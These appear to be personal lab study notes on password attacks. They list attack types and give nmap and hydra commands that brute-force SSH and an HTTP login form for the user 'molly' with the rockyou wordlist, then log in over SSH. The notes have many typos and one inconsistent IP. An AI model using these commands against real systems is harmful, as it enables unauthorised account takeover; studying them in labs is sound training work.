PASSWORD ATTACK

TYPE OF PASSWORD ATTACK
. simple brute force attack trying all posible combinations
. dictionary attacks using comman words and phrases
. hybrid attacks combining brute force and dictionary methods
. credentials stuffing using exposed credentials from data breaches

1. we to scan our target by nmap <target ip>
then we can see which ports are open 

1st in ssh:

┌──(kali㉿kali)-[~]
└─$ hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.10.217.225

. molly is our username 
. l is user and p for passward

also
┌──(kali㉿kali)-[~]
└─$ ssh <domain name>\\<username>@<ip>

2nd in http:

┌──(kali㉿kali)-[~]
└─$ hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.27.217.225 http-post-form "/login:username=^user^&passward=^pass^:your username or passward is incorrect" -v


if we have username we use l else L
if we have passward we use p else P



after we get passward

┌──(kali㉿kali)-[~]
└─$ ssh molly@10.10.217.225

than enter passward:xxxxx


